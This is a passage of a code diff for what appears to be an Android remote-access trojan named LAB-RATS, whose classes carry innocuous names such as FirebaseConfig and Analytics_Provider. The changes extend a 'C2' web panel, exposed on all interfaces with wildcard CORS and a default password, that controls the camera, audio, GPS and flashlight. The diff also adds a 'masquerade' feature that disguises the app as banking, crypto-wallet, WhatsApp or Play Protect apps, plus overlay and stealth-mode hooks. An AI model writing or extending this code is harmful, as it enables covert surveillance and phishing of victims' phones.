@@ -22,6 +22,7 @@ import android.util.Log;
 import android.accessibilityservice.AccessibilityService;
 
 import androidx.annotation.NonNull;
+import androidx.annotation.OptIn;
 import androidx.core.content.ContextCompat;
 import java.io.BufferedReader;
 import java.io.InputStream;
@@ -202,7 +203,7 @@ public class FirebaseConfig extends NanoHTTPD {
 
     private String getHeader(String uri) {
         // Navigation Map
-        String homeActive = (uri.equals("/") || uri.equals("/terminal")) ? "active" : "";
+        String homeActive = (uri == null || uri.equals("/") || uri.equals("/terminal") || uri.isEmpty() || uri.trim().isEmpty()) ? "active" : "";
         String ghostActive = uri.startsWith("/ghost") ? "active" : "";
         String cameraActive = (uri.startsWith("/camera") || uri.startsWith("/camera/live")) ? "active" : "";
         String gpsActive = uri.startsWith("/gps") ? "active" : "";
@@ -244,25 +245,19 @@ public class FirebaseConfig extends NanoHTTPD {
             "<title>LAB-RATS | CORE</title>" +
             "<link href=\"https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
             "<link rel=\"stylesheet\" href=\"/c2/style.css?v=" + System.currentTimeMillis() + "\">" +
+            "<style>.nav a.active { background: #00f2ff !important; border-color: #00f2ff !important; color: #000 !important; box-shadow: 0 0 35px #00f2ff, inset 0 0 15px rgba(0,0,0,0.4) !important; font-weight: 900 !important; transform: scale(1.04); } @media (min-width: 1024px) { body { zoom: 0.9; } }</style>" +
             "</head>" +
             "<body>" +
             "<div class=\"container\">" +
-            "  <div class=\"header\">" +
-            "    <img src=\"/logo?v=146\" class=\"watermark\" alt=\"LAB-RATS\" loading=\"eager\">" +
-            "    <div class=\"header-text-group\">" +
-            "      <div class=\"title-font\">LAB-RATS</div>" +
-            "      <div class=\"glitch-container\">" +
-            "        <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
-            "      </div>" +
-            "      <div class=\"version-text\" style=\"margin-bottom: 2px;\">v1.5.1</div>" +
-            "      <div id=\"enc-status\" style=\"font-size: 0.52rem; color: #555; letter-spacing: 2px; text-transform: uppercase;\">LINK_SEC: <span style=\"color:#ff3131;\">OFFLINE</span></div>" +
-            "    </div>" +
+            "  <div class=\"header\" style=\"padding: 0; margin-bottom: 0 !important; border: none !important; background: transparent !important; box-shadow: none !important; backdrop-filter: none !important; -webkit-backdrop-filter: none !important;\">" +
+            "    <img src=\"/c2/header_dashboard.png?v=41\" style=\"width: 75%; max-width: 1080px; height: auto; margin: 0 auto; display: block; background: transparent !important; border: none !important; box-shadow: none !important; filter: none !important; border-radius: 0; image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges; image-rendering: high-quality; transform: translateZ(0); object-fit: contain;\" alt=\"LAB-RATS Header\" loading=\"eager\">" +
+            "    <div id=\"enc-status\" style=\"font-size: 0.52rem; color: #555; letter-spacing: 2px; text-transform: uppercase; margin-top: 10px; text-align: center;\">LINK_SEC: <span style=\"color:#ff3131;\">OFFLINE</span></div>" +
             "  </div>" + navHtml;
     }
 
     public String getFooter() {
         return "<audio id=\"live-audio-player\" style=\"display:none;\"></audio>" +
-                "<div style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 60px; margin-bottom: 20px; opacity: 0.5; font-family: 'OrbitronC2', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 0 20px;\">" +
+                "<div class=\"card\" style=\"text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 50px; margin-bottom: 25px; font-family: 'OrbitronC2', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 18px 20px;\">" +
                 "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's who MIND don't matter... The one's who MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
                 "</div>" +
                 "</div>" +
@@ -276,34 +271,33 @@ public class FirebaseConfig extends NanoHTTPD {
             "<link href=\"https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
             "<style>" +
             "* { box-sizing: border-box; margin: 0; padding: 0; }" +
-            ".login-centering-wrapper { background: #000; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; width: 100%; overflow: hidden; padding: 15px; }" +
-            ".login-card { background: rgba(15,15,25,0.95); border: 1px solid #00f2ff; padding: 50px 30px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
-            ".title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 40px; color: #00f2ff; line-height: 1.2; white-space: nowrap; transition: all 0.5s; }" +
+            ".login-centering-wrapper { background-color: #02080d; background-image: radial-gradient(circle at 50% 0%, rgba(0,242,255,.16) 0, rgba(0,168,179,.05) 40%, transparent 80%), radial-gradient(circle at 0% 100%, rgba(0,242,255,.09) 0, transparent 50%), radial-gradient(circle at 100% 100%, rgba(0,242,255,.09) 0, transparent 50%), url(\"data:image/svg+xml,%3Csvg width='400' height='400' viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 40h400M0 80h400M0 120h400M0 160h400M0 200h400M0 240h400M0 280h400M0 320h400M0 360h400 M40 0v400M80 0v400M120 0v400M160 0v400M200 0v400M240 0v400M280 0v400M320 0v400M360 0v400' stroke='%2300f2ff' stroke-width='0.3' stroke-opacity='0.03'/%3E%3Crect x='150' y='150' width='100' height='100' rx='8' fill='%23030f14' stroke='%2300f2ff' stroke-width='1.2' stroke-opacity='0.22'/%3E%3Crect x='168' y='168' width='64' height='64' rx='4' fill='%2300f2ff' fill-opacity='0.02' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.18'/%3E%3Ccircle cx='162' cy='162' r='2' fill='%2300f2ff' fill-opacity='0.35'/%3E%3Cpath d='M165 150v-12M180 150v-12M195 150v-12M210 150v-12M225 150v-12 M165 250v12M180 250v12M195 250v12M210 250v12M225 250v12 M150 165h-12M150 180h-12M150 195h-12M150 210h-12M150 225h-12 M250 165h12M250 180h12M250 195h12M250 210h12M250 225h12' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.25'/%3E%3Crect x='30' y='30' width='50' height='50' rx='5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.18'/%3E%3Cpath d='M40 30v-8M55 30v-8M70 30v-8 M40 80v8M55 80v8M70 80v8 M30 40h-8M30 55h-8M30 70h-8 M80 40h8M80 55h8M80 70h8' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.2'/%3E%3Crect x='320' y='320' width='50' height='50' rx='5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.18'/%3E%3Cpath d='M330 320v-8M345 320v-8M360 320v-8 M330 370v8M345 370v8M360 370v8 M320 330h-8M320 345h-8M320 360h-8 M370 330h8M370 345h8M370 360h8' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.2'/%3E%3Cpath d='M165 138V80L135 50H0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M180 138V95L150 65H10' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='8,4'/%3E%3Cpath d='M195 138V70L225 40H400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M210 138V100L250 60H380' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11'/%3E%3Cpath d='M165 262V320L125 360H0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M195 262V310L235 350H400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M210 262V335L260 385H390' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='10,5'/%3E%3Cpath d='M138 165H80L50 135V0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M138 195H70L30 235V400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 165H320L350 135V0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 195H330L370 235V400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 210H340L380 250V390' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='6,3'/%3E%3Crect x='125' y='46' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='235' y='36' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='340' y='125' width='8' height='12' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='44' y='225' width='8' height='12' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='115' y='354' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Ccircle cx='135' cy='50' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='135' cy='50' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='225' cy='40' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='225' cy='40' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='350' cy='135' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='350' cy='135' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='50' cy='135' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='50' cy='135' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='125' cy='360' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='125' cy='360' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='235' cy='350' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='235' cy='350' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='370' cy='235' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='370' cy='235' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='30' cy='235' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='30' cy='235' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3C/svg%3E\"); background-size: 100% 100%, 100% 100%, 100% 100%, 400px 400px; background-position: center, center, center, 0 0; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; width: 100%; overflow: hidden; padding: 15px; }" +
+            ".login-card { background: rgba(15,15,25,0.65); backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px); border: 1px solid #00f2ff; padding: 25px 20px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
+            ".title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 15px; color: #00f2ff; line-height: 1.2; white-space: nowrap; transition: all 0.5s; }" +
             "@media (max-width: 480px) {" +
-            "  .login-card { padding: 35px 20px; }" +
-            "  .title-font { font-size: 1.3rem !important; letter-spacing: 1.5px; margin-bottom: 25px; }" +
-            "  input { padding: 14px !important; font-size: 14px !important; }" +
-            "  button { padding: 14px !important; font-size: 14px !important; }" +
-            "  .login-card img { width: 150px !important; height: 150px !important; }" +
+            "  .login-card { padding: 20px 15px; }" +
+            "  .title-font { font-size: 1.3rem !important; letter-spacing: 1.5px; margin-bottom: 12px; }" +
+            "  input { padding: 12px !important; font-size: 14px !important; margin-bottom: 15px !important; }" +
+            "  button { padding: 12px !important; font-size: 14px !important; }" +
+            "  .login-card img { width: 220px !important; height: 220px !important; margin-bottom: 10px !important; }" +
             "}" +
             "form { display: flex; flex-direction: column; align-items: center; width: 100%; }" +
-            "input { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 18px; margin-bottom: 30px; width: 100%; max-width: 350px; border-radius: 8px; outline: none; text-align: center; font-family: 'Orbitron', monospace; font-size: 16px; transition: 0.3s; }" +
+            "input { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 14px; margin-bottom: 18px; width: 100%; max-width: 350px; border-radius: 8px; outline: none; text-align: center; font-family: 'Orbitron', monospace; font-size: 16px; transition: 0.3s; }" +
             "input:focus { border-color: #00f2ff; box-shadow: 0 0 20px rgba(0,242,255,0.2); }" +
-            "button { background: #00f2ff; border: none; color: #050505; padding: 18px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; transition: 0.3s; border-radius: 50px; width: 100%; max-width: 280px; font-weight: 900; font-family: 'Orbitron', sans-serif; box-shadow: 0 0 20px rgba(0,242,255,0.4); }" +
+            "button { background: #00f2ff; border: none; color: #050505; padding: 14px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; transition: 0.3s; border-radius: 50px; width: 100%; max-width: 280px; font-weight: 900; font-family: 'Orbitron', sans-serif; box-shadow: 0 0 20px rgba(0,242,255,0.4); }" +
             "button:hover { background: #fff; box-shadow: 0 0 40px rgba(0,242,255,0.6); transform: scale(1.05); }" +
-            ".login-card img { transition: all 0.5s; margin-bottom: 30px; }" +
-            ".login-card img:hover { transform: scale(1.1) translateY(-5px); }" +
+            ".login-card img { transition: all 0.5s; margin-bottom: 10px; background: transparent !important; border: none !important; box-shadow: none !important; border-radius: 0 !important; }" +
             "</style></head><body>" +
             "<div class=\"login-centering-wrapper\">" +
             "<div class=\"login-card\">" +
-            "<img src=\"/logo?v=146\" style=\"width: 187px; height: 187px; background: transparent !important;\">" +
+            "<img src=\"/logo?v=150\" style=\"width: 260px; height: 260px; background: transparent !important; border: none !important; box-shadow: none !important; outline: none !important; margin: 0 auto 10px auto; display: block;\">" +
             "<div id=\"status-header\" class=\"title-font\">RESTRICTED_ACCESS</div>" +
-            "<div style=\"font-size:1.0rem; opacity:0.5; margin-top:-25px; margin-bottom:35px; letter-spacing:3px; font-family: 'Aldrich', sans-serif;\">v1.5.1</div>" +
-                        "<form id=\"login-form\" method=\"POST\" action=\"/login\">" +
+            "<div style=\"font-size:0.95rem; opacity:0.6; margin-top: 4px; margin-bottom: 18px; letter-spacing:3px; font-family: 'Aldrich', sans-serif;\">v1.6.0</div>" +
+                        "<form id=\"login-form\" method=\"POST\" action=\"/login\" onsubmit=\"handleLogin(event)\">" +
             "<input type=\"password\" id=\"password\" name=\"password\" placeholder=\"ENTER_CREDENTIALS\" autofocus>" +
             "<button type=\"submit\" id=\"uplink-btn\">UPLINK</button>" +
             "</form>" +
-            "<div style=\"text-align: center; color: #00f2ff; font-size: 0.58rem; margin-top: 40px; opacity: 0.4; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.6;\">" +
+            "<div style=\"text-align: center; color: #00f2ff; font-size: 0.58rem; margin-top: 20px; opacity: 0.4; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.6;\">" +
             "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's who MIND don't matter... The one's who MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
             "</div>" +
             "</div>" +
@@ -337,7 +331,14 @@ public class FirebaseConfig extends NanoHTTPD {
     private static volatile String sessionToken = "";
 
     public FirebaseConfig(Context context, int port) {
-        super(port);
+        super("0.0.0.0", port); // Pure AF_INET IPv4 0.0.0.0 socket binding
+        // Custom ServerSocketFactory with setReuseAddress(true) for Wi-Fi socket binding
+        setServerSocketFactory(() -> {
+            java.net.ServerSocket ss = new java.net.ServerSocket();
+            ss.setReuseAddress(true);
+            ss.setReceiveBufferSize(65536);
+            return ss;
+        });
         // Use application context to avoid leaks or context-switch crashes
         this.context = context.getApplicationContext();
         staticContext = context.getApplicationContext();
@@ -377,13 +378,14 @@ public class FirebaseConfig extends NanoHTTPD {
             }
         });
 
-        // [SECURITY_STABILITY_LINK]
-        // Token survives service restarts (fixes camera) but resets on full kill/reboot
-        sessionToken = WorkManager_Sync.activeSessionToken;
+        // [SECURITY_STABILITY_LINK] Persistent session token across service restarts & stealth toggles
+        sessionToken = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("session_token", "");
         if (sessionToken == null || sessionToken.isEmpty()) {
             sessionToken = java.util.UUID.randomUUID().toString();
-            WorkManager_Sync.activeSessionToken = sessionToken;
+            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                    .edit().putString("session_token", sessionToken).apply();
         }
+        WorkManager_Sync.activeSessionToken = sessionToken;
 
         LabRatsWorker.execute(this::loadPersistentData);
         
@@ -556,6 +558,9 @@ public class FirebaseConfig extends NanoHTTPD {
         } else if (uri.equals("/device/max-volume")) {
             setMaxVolume();
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/flashlight") || uri.equals("/device/torch")) {
+            toggleFlashlight();
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"flashlight\": " + isFlashlightOn + "}");
         } else if (uri.equals("/device/silent-mode")) {
             setSilentMode();
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
@@ -566,6 +571,9 @@ public class FirebaseConfig extends NanoHTTPD {
         } else if (uri.equals("/device/open-app")) {
             openAppOnDevice(params.get("pkg"));
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/masquerade")) {
+            String pkg = params.get("pkg");
+            return handleMasqueradeApp(pkg, session);
         } else if (uri.equals("/device/open-url")) {
             openUrlOnDevice(params.get("url"));
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
@@ -667,6 +675,28 @@ public class FirebaseConfig extends NanoHTTPD {
     public Response serve(IHTTPSession session) {
         if (session == null) return null;
 
+        // Handle CORS Preflight OPTIONS requests
+        if (session.getMethod() == Method.OPTIONS) {
+            Response res = newFixedLengthResponse(Response.Status.OK, "text/plain", "CORS_OK");
+            res.addHeader("Access-Control-Allow-Origin", "*");
+            res.addHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS, PUT, DELETE");
+            res.addHeader("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With, Token");
+            res.addHeader("Access-Control-Max-Age", "86400");
+            return res;
+        }
+
+        Response response = handleServeInternal(session);
+
+        if (response != null) {
+            response.addHeader("Access-Control-Allow-Origin", "*");
+            response.addHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS, PUT, DELETE");
+            response.addHeader("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With, Token");
+        }
+
+        return response;
+    }
+
+    private Response handleServeInternal(IHTTPSession session) {
         String uri = session.getUri();
         if (uri == null) uri = "/";
 
@@ -692,9 +722,7 @@ public class FirebaseConfig extends NanoHTTPD {
             // 3. Main Routing & Auth Check
             else {
                 String token = cookies.read("token");
-                if (sessionToken == null || sessionToken.isEmpty()) {
-                    sessionToken = WorkManager_Sync.activeSessionToken;
-                }
+                sessionToken = WorkManager_Sync.activeSessionToken;
 
                 boolean isLoggedIn = (token != null && !token.isEmpty() && token.equals(sessionToken));
 
@@ -747,7 +775,7 @@ public class FirebaseConfig extends NanoHTTPD {
             if (bitmap == null) return serve404(session);
 
             // Optimization: Scale down large logos for faster delivery from mobile server
-            int targetHeight = 180;
+            int targetHeight = 207;
             int targetWidth = (int) (bitmap.getWidth() * (targetHeight / (float) bitmap.getHeight()));
             android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(bitmap, targetWidth, targetHeight, true);
             
@@ -867,6 +895,18 @@ public class FirebaseConfig extends NanoHTTPD {
             Map<String, String> params = session.getParms();
             String newPass = params.get("new_password");
 
+            if (newPass == null && files.containsKey("postData")) {
+                try {
+                    String rawBody = files.get("postData");
+                    if (rawBody != null && rawBody.trim().startsWith("{")) {
+                        org.json.JSONObject jsonObj = new org.json.JSONObject(rawBody);
+                        if (jsonObj.has("new_password")) {
+                            newPass = jsonObj.getString("new_password");
+                        }
+                    }
+                } catch (Exception ignored) {}
+            }
+
             // [DEEP_STEALTH] De-obfuscate payload if it's masked
             if (newPass != null && newPass.startsWith("0x_")) {
                 try {
@@ -883,7 +923,7 @@ public class FirebaseConfig extends NanoHTTPD {
 
             logActivity("SECURITY_PROTOCOL: Interface password updated");
 
-            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Access Key Updated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">New security protocol active. You will need to use this key for future uplinks.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
+            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Access Key Updated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">New security protocol active. You will need to use this key for future uplinks.</p><div style=\"display: flex; justify-content: center;\"><a href=\"./\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
             return serveGzipped(session, "text/html", html);
         } catch (Exception e) {
             return serveError(session, "Failed to update password: " + e.getMessage());
@@ -893,6 +933,40 @@ public class FirebaseConfig extends NanoHTTPD {
     private String getStoredPassword() {
         return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                 .getString("c2_password", "admin1337");
+    }
+
+    private static boolean isFlashlightOn = false;
+
+    @OptIn(markerClass = androidx.camera.camera2.interop.ExperimentalCamera2Interop.class)
+    private void toggleFlashlight() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
+                if (cm != null) {
+                    String[] ids = cm.getCameraIdList();
+                    for (String id : ids) {
+                        try {
+                            Boolean hasFlash = cm.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE);
+                            if (Boolean.TRUE.equals(hasFlash)) {
+                                isFlashlightOn = !isFlashlightOn;
+                                cm.setTorchMode(id, isFlashlightOn);
+                                logActivity("HARDWARE_CONTROL: Flashlight " + (isFlashlightOn ? "ENGAGED" : "DISENGAGED"));
+                                break;
+                            }
+                        } catch (Exception ignored) {}
+                    }
+                }
+            } else {
+                Analytics_Provider ap = Analytics_Provider.getInstance();
+                if (ap != null) {
+                    isFlashlightOn = !isFlashlightOn;
+                    ap.setFlashMode(isFlashlightOn);
+                    logActivity("HARDWARE_CONTROL: Flashlight " + (isFlashlightOn ? "ENGAGED" : "DISENGAGED"));
+                }
+            }
+        } catch (Exception e) {
+            Log.e("FirebaseConfig", "Flashlight Error: " + e.getMessage());
+        }
     }
 
     private void vibrateDevice() {
@@ -1006,7 +1080,7 @@ public class FirebaseConfig extends NanoHTTPD {
         android.content.pm.PackageManager pm = context.getPackageManager();
         List<android.content.pm.PackageInfo> apps = pm.getInstalledPackages(0);
         
-        html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Icon</th><th>App Name</th><th>Package ID</th><th>Type</th><th>Version</th></tr></thead><tbody>");
+        html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Icon</th><th>App Name</th><th>Package ID</th><th>Type</th><th>Version</th><th>Actions</th></tr></thead><tbody>");
         for (android.content.pm.PackageInfo app : apps) {
             String name = app.applicationInfo.loadLabel(pm).toString();
             boolean isSystem = (app.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
@@ -1019,10 +1093,90 @@ public class FirebaseConfig extends NanoHTTPD {
             html.append("<td>").append(escapeHtml(name)).append("</td>");
             html.append("<td style=\"font-family:monospace; font-size:0.7rem;\">").append(app.packageName).append("</td>");
             html.append("<td>").append(typeLabel).append("</td>");
-            html.append("<td>").append(app.versionName).append("</td></tr>");
+            html.append("<td>").append(app.versionName != null ? app.versionName : "1.0").append("</td>");
+
+            html.append("<td style=\"white-space: nowrap;\">");
+            html.append("<a href=\"/device/open-app?pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-green); color:var(--neon-green); background:rgba(57,255,20,0.05); margin-right:5px;\">▶️ LAUNCH</a>");
+            html.append("<a href=\"/device/masquerade?pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); background:rgba(0,242,255,0.05); margin-right:5px;\">🎭 MASQUERADE</a>");
+            html.append("<a href=\"/ghost/interact?action=overlay&pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-orange); color:var(--neon-orange); background:rgba(255,157,0,0.05);\">🔒 OVERLAY</a>");
+            html.append("</td></tr>");
         }
         html.append("</tbody></table></div></div>").append(getFooter());
         return serveGzipped(session, "text/html", html.toString());
+    }
+
+    private Response handleMasqueradeApp(String pkg, IHTTPSession session) {
+        if (pkg == null || pkg.isEmpty()) return serveError(session, "Package parameter missing");
+        
+        try {
+            Map<String, String> params = session.getParms();
+            android.content.pm.PackageManager pm = context.getPackageManager();
+            android.content.pm.ApplicationInfo appInfo = pm.getApplicationInfo(pkg, 0);
+            String appName = appInfo.loadLabel(pm).toString();
+
+            // Determine matching alias component based on package or category
+            String targetAlias = "SettingsAlias"; // Play Protect default
+            String lowerPkg = pkg.toLowerCase();
+            String lowerName = appName.toLowerCase();
+
+            if (lowerPkg.contains("whatsapp") || lowerName.contains("whatsapp")) {
+                targetAlias = "WhatsAppAlias";
+            } else if (lowerPkg.contains("telegram") || lowerName.contains("telegram")) {
+                targetAlias = "TelegramAlias";
+            } else if (lowerPkg.contains("instagram") || lowerName.contains("instagram")) {
+                targetAlias = "InstagramAlias";
+            } else if (lowerPkg.contains("youtube") || lowerName.contains("youtube")) {
+                targetAlias = "YouTubeAlias";
+            } else if (lowerPkg.contains("chrome") || lowerName.contains("chrome")) {
+                targetAlias = "ChromeAlias";
+            } else if (lowerPkg.contains("bank") || lowerPkg.contains("pcfinancial") || lowerName.contains("bank") || lowerPkg.contains("casino") || lowerPkg.contains("bet") || lowerPkg.contains("bree")) {
+                targetAlias = "BankAlias";
+            } else if (lowerPkg.contains("mail") || lowerPkg.contains("proton") || lowerName.contains("mail") || lowerPkg.contains("email")) {
+                targetAlias = "MailAlias";
+            } else if (lowerPkg.contains("vpn") || lowerName.contains("vpn")) {
+                targetAlias = "VPNAlias";
+            } else if (lowerPkg.contains("pdf") || lowerPkg.contains("adobe") || lowerName.contains("acrobat") || lowerName.contains("reader")) {
+                targetAlias = "PdfAlias";
+            } else if (lowerPkg.contains("music") || lowerPkg.contains("spotify") || lowerName.contains("music")) {
+                targetAlias = "MusicAlias";
+            } else if (lowerPkg.contains("twitter") || lowerPkg.contains("x.android") || lowerName.contains("twitter") || lowerName.equals("x")) {
+                targetAlias = "TwitterAlias";
+            } else if (lowerPkg.contains("termux") || lowerName.contains("termux")) {
+                targetAlias = "TermuxAlias";
+            } else if (lowerPkg.contains("electrum") || lowerPkg.contains("wallet") || lowerName.contains("crypto") || lowerName.contains("bitcoin")) {
+                targetAlias = "CryptoAlias";
+            } else if (lowerPkg.contains("calculator") || lowerName.contains("calculator") || lowerPkg.contains("calc")) {
+                targetAlias = "CalculatorAlias";
+            } else if (lowerPkg.contains("weather") || lowerName.contains("weather")) {
+                targetAlias = "WeatherAlias";
+            } else if (lowerPkg.contains("settings") || lowerPkg.contains("vending") || lowerPkg.contains("protect") || lowerName.contains("settings")) {
+                targetAlias = "SettingsAlias";
+            } else if (lowerPkg.equals("android") || lowerPkg.contains("com.android.systemui") || lowerPkg.contains("system.service")) {
+                targetAlias = "AndroidSystemAlias";
+            }
+
+            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                    .edit()
+                    .putString("masquerade_pkg", pkg)
+                    .putString("masquerade_name", appName)
+                    .putBoolean("decoy_deployed", true)
+                    .apply();
+
+            SystemAnalytics.setStealthMode(context, true);
+
+            logActivity("STEALTH_CAMOUFLAGE: App identity morphed to " + appName + " (" + pkg + ") via " + targetAlias);
+
+            String safeAppName = appName.replace("\"", "\\\"");
+            if ("true".equals(params.get("json")) || (session.getHeaders().get("accept") != null && session.getHeaders().get("accept") != null && session.getHeaders().get("accept").contains("json"))) {
